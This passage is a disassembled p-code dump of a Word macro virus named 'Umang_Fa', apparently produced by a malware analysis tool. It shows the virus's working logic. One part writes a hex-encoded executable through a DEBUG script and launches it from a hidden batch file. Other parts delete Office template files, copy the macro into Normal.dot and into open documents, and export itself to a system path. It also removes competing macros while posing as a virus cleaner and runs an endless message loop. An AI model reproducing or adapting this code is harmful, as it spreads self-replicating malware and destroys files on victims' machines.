' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1220 52 36 30 32 30 0D 0A 2D 20 75 6E 65 78 70 65 63"
' 	PrintItemNL 
' Line #428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1230 74 65 64 20 51 75 69 63 6B 57 69 6E 20 65 72 72"
' 	PrintItemNL 
' Line #429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1240 6F 72 0D 0A 00 08 00 52 36 30 30 38 0D 0A 2D 20"
' 	PrintItemNL 
' Line #430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1250 6E 6F 74 20 65 6E 6F 75 67 68 20 73 70 61 63 65"
' 	PrintItemNL 
' Line #431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1260 20 66 6F 72 20 61 72 67 75 6D 65 6E 74 73 0D 0A"
' 	PrintItemNL 
' Line #432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1270 00 15 00 52 36 30 32 31 0D 0A 2D 20 6E 6F 20 6D"
' 	PrintItemNL 
' Line #433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1280 61 69 6E 20 70 72 6F 63 65 64 75 72 65 0D 0A 00"
' 	PrintItemNL 
' Line #434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1290 FC 00 0D 0A 00 FF 00 72 75 6E 2D 74 69 6D 65 20"
' 	PrintItemNL 
' Line #435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12A0 65 72 72 6F 72 20 00 02 00 52 36 30 30 32 0D 0A"
' 	PrintItemNL 
' Line #436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12B0 2D 20 66 6C 6F 61 74 69 6E 67 2D 70 6F 69 6E 74"
' 	PrintItemNL 
' Line #437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12C0 20 73 75 70 70 6F 72 74 20 6E 6F 74 20 6C 6F 61"
' 	PrintItemNL 
' Line #438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12D0 64 65 64 0D 0A 00 FF FF FF 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1340 00 00 01 00 01 00 20 20 10 00 01 00 04 00 E8 02"
' 	PrintItemNL 
' Line #446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1350 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1360 28 00 00 00 20 00 00 00 40 00 00 00 01 00 04 00"
' 	PrintItemNL 
' Line #448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1370 00 00 00 00 80 02 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00"
' 	PrintItemNL 
' Line #450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1390 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00"
' 	PrintItemNL 
' Line #451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13A0 80 80 00 00 80 80 80 00 C0 C0 C0 00 00 00 FF 00"
' 	PrintItemNL 
' Line #452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13B0 00 FF 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00"
' 	PrintItemNL 
' Line #453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13C0 FF FF 00 00 FF FF FF 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13D0 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13E0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13F0 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1400 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1410 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1420 FF FF FF FF F9 FF FF 00 FF F9 99 9F FF FF FF FF"
' 	PrintItemNL 
' Line #460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1430 FF FF FF FF 9F 9F FF 00 FF FF FF F9 99 9F FF FF"
' 	PrintItemNL 
' Line #461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1440 FF FF FF F9 FF F9 FF 00 FF FF FF FF FF 9F FF FF"
' 	PrintItemNL 
' Line #462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1450 FF FF FF 9F FF FF FF 00 FF FF FF FF FF F9 FF FF"
' 	PrintItemNL 
' Line #463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1460 FF FF F9 FF FF FF FF 00 FF FF FF FF FF F9 9F FF"
' 	PrintItemNL 
' Line #464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1470 FF FF F9 FF FF FF FF 00 FF FF FF FF FF FF 9F FF"
' 	PrintItemNL 
' Line #465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1480 FF FF 99 FF FF FF FF 00 FF FF FF FF FF FF 99 99"
' 	PrintItemNL 
' Line #466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1490 99 99 9F FF FF FF FF 00 FF FF FF FF FF FF F9 99"
' 	PrintItemNL 
' Line #467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14A0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF F9 99"
' 	PrintItemNL 
' Line #468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14B0 FF FF FF FF FF FF FF 00 FF FF FF 9F FF FF FF 99"
' 	PrintItemNL 
' Line #469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14C0 9F FF FF F9 FF FF FF 00 FF FF FF F9 FF FF FF F9"
' 	PrintItemNL 
' Line #470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14D0 9F FF FF 9F 9F FF FF 00 FF FF FF FF 9F FF FF FF"
' 	PrintItemNL 
' Line #471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14E0 99 FF 99 FF F9 FF FF 00 FF FF FF FF F9 FF FF FF"
' 	PrintItemNL 
' Line #472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14F0 99 F9 FF FF FF 9F FF 00 FF FF FF FF FF 9F FF FF"
' 	PrintItemNL 
' Line #473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1500 99 9F FF FF FF FF FF 00 FF FF FF FF FF F9 99 99"
' 	PrintItemNL 
' Line #474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1510 99 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1520 FF 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1530 FF 99 99 FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1540 FF F9 99 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1550 FF F9 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1560 FF FF 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1570 FF FF F9 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1580 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1590 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15A0 FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15C0 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 03"
' 	PrintItemNL 
' Line #486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15D0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15E0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15F0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1600 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1610 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1620 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1630 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1640 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "1550"
' 	PrintItemNL 
' Line #496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #498:
' 	Ld hFile 
' 	Close 0x0001 
' Line #499:
' 	EndSub 
' Line #500:
' 	FuncDefn (Sub startv(strFile As String))
' Line #501:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #502:
' 	Ld hFile 
' 	Close 0x0001 
' Line #503:
' 	OnError (Resume Next) 
' Line #504:
' 	Ld Friend 
' 	St hFile 
' Line #505:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cd\"
' 	PrintItemNL 
' Line #508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "debug < start.scr > nul"
' 	PrintItemNL 
' Line #509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "copy start.com start.exe"
' 	PrintItemNL 
' Line #510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.com"
' 	PrintItemNL 
' Line #511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.scr"
' 	PrintItemNL 
' Line #512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "start"
' 	PrintItemNL 
' Line #513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.com"
' 	PrintItemNL 
' Line #514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "del startv.bat"
' 	PrintItemNL 
' Line #515:
' 	Ld hFile 
' 	Close 0x0001 
' Line #516:
' 	LitStr 0x000D "c:\startv.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #517:
' 	EndSub 
' Line #518:
' 	FuncDefn (Sub zap(strFile As String))
' Line #519:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #520:
' 	Ld hFile 
' 	Close 0x0001 
' Line #521:
' 	OnError (Resume Next) 
' Line #522:
' 	Ld Friend 
' 	St hFile 
' Line #523:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "del c:\progra~1\micros~1\office\startup\*.dot"
' 	PrintItemNL 
' Line #526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "del c:\progra~1\micros~1\templa~1\*.dot"
' 	PrintItemNL 
' Line #527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del zap.bat"
' 	PrintItemNL 
' Line #528:
' 	Ld hFile 
' 	Close 0x0001 
' Line #529:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #530:
' 	EndSub 
' Line #531:
' 	FuncDefn (Sub FileOpen())
' Line #532:
' 	OnError (Resume Next) 
' Line #533:
' 	ArgsCall WBT 0x0000 
' Line #534:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #535:
' 	QuoteRem 0x0000 0x000D "Call AutoOpen"
' Line #536:
' 	ArgsCall Dockenor 0x0000 
' Line #537:
' 	ArgsCall Norkedoc 0x0000 
' Line #538:
' 	ArgsCall (Call) Umang_Fa 0x0000 
' Line #539:
' 	ArgsCall WBF 0x0000 
' Line #540:
' 	ElseBlock 
' Line #541:
' 	ArgsCall WBF 0x0000 
' Line #542:
' 	EndIfBlock 
' Line #543:
' 	EndSub 
' Line #544:
' 	FuncDefn (Sub pesen())
' Line #545:
' 	LitStr 0x0021 "Eh....kamu Kurang Ajar dibilangin"
' 	St msg1 
' Line #546:
' 	LitStr 0x0022 "Nah..... Gue Murka... Gue sumpahin"
' 	St msg2 
' Line #547:
' 	LitStr 0x0023 "..........GEMPA BUMI .............."
' 	St msg3 
' Line #548:
' 	Ld msg1 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #549:
' 	EndSub 
' Line #550:
' 	FuncDefn (Sub ultah())
' Line #551:
' 	Do 
' Line #552:
' 	LitStr 0x0013 "Unang Triwidhiyanti"
' 	St nama1 
' Line #553:
' 	LitStr 0x000F "Nur firmanullah"
' 	St Nama2 
' Line #554:
' 	LitStr 0x002B "Hari ini hari yang berbahagia buat temanku "
' 	St msg1 
' Line #555:
' 	LitStr 0x0040 "Jadi Elo-elo pade Nggak usah ngetik yang buat elo pusing deh...."
' 	St msg2 
' Line #556:
' 	LitStr 0x0041 "Mendingan Elo sekarang matiin komputer terus tidur dan istirahat "
' 	St msg3 
' Line #557:
' 	LitStr 0x0038 "Tapi Jangan Lupa Loh... Ucapin selamat Ulang tahun Buat "
' 	St msg4 
' Line #558:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld nama1 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Ld nama1 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x000C "Pesen Mimang"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #559:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Ld Nama2 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x000C "Pesen Mimang"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #560:
' 	Loop 
' Line #561:
' 	EndSub 
' Line #562:
' 	FuncDefn (Function Dockenor())
' Line #563:
' 	OnError Erw1 
' Line #564:
' 	LitVarSpecial (False)
' 	St Norok 
' Line #565:
' 	ArgsCall WBT 0x0000 
' Line #566:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #567:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #568:
' 	OnError Erh1a 
' Line #569:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #570:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #571:
' 	Ld NMacr 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Norok 
' 	EndIf 
' Line #572:
' 	Ld NMacr 
' 	LitStr 0x0008 "Umang_Fa"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #573:
' 	LitStr 0x002B "Normal Template Anda Terkena Virus Macro = "
' 	Ld NMacr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002B "Virus Makro akan dihapus dan tunggu Sejenak"
' 	Add 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x000C "Pesen Mimang"
' 	ArgsCall MsgBox 0x0003 
' Line #574:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #575:
' Line #576:
' 	EndIfBlock 
' Line #577:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #578:
' 	Label Erh1a 
' Line #579:
' 	Ld Norok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #580:
' 	OnError Erh1 
' Line #581:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Umang_Fa"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #582:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #583:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemLd Application 
' 	MemSt Visible 
' Line #584:
' 	Label Erh1 
' Line #585:
' 	EndIfBlock 
' Line #586:
' 	Label Erw1 
' Line #587:
' 	EndFunc 
' Line #588:
' 	FuncDefn (Function Norkedoc())
' Line #589:
' 	OnError Erw2 
' Line #590:
' 	LitDI2 0x0000 
' 	St DokSave 
' Line #591:
' 	LitVarSpecial (False)
' 	St Dokok 
' Line #592:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #593:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #594:
' 	OnError Erh2a 
' Line #595:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #596:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #597:
' 	Ld NMacr 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #598:
' 	QuoteRem 0x0006 0x0029 "NMacr = NT.VBProject.VBComponents(i).Name"
' Line #599:
' 	QuoteRem 0x0006 0x0027 "If NMacr = "Umang_Fa" Then Dokok = True"
' Line #600:
' 	LineCont 0x0004 07 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0008 "Umang_Fa"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #601:
' 	LitStr 0x0023 "Documen Anda Terkena Virus Macro = "
' 	Ld NMacr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002B "Virus Makro akan dihapus dan tunggu Sejenak"
' 	Add 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x000C "Pesen Mimang"
' 	ArgsCall MsgBox 0x0003 
' Line #602:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #603:
' 	EndIfBlock 
' Line #604:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #605:
' 	Label Erh2a 
' Line #606:
' 	Ld Dokok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #607:
' 	OnError Erh2 
' Line #608:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Umang_Fa"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #609:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #610:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #611:
' 	Label Erh2 
' Line #612:
' 	EndIfBlock 
' Line #613:
' 	Label Erw2 
' Line #614:
' 	EndFunc 
' Line #615:
' 	FuncDefn (Function WBT())
' Line #616:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #617:
' 	EndFunc 
' Line #618:
' 	FuncDefn (Function WBF())
' Line #619:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #620:
' 	EndFunc 
' Line #621:
' 	FuncDefn (Function sim())
' Line #622:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St f56879025 
' Line #623:
' 	LitStr 0x0019 "c:\windows\system\vxd.sys"
' 	LitStr 0x0008 "Umang_Fa"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #624:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo bodo 
' 	EndIf 
' Line #625:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo bodo 
' 	EndIf 
' Line #626:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #627:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St xxx902578112 
' 	EndIf 
' Line #628:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #629:
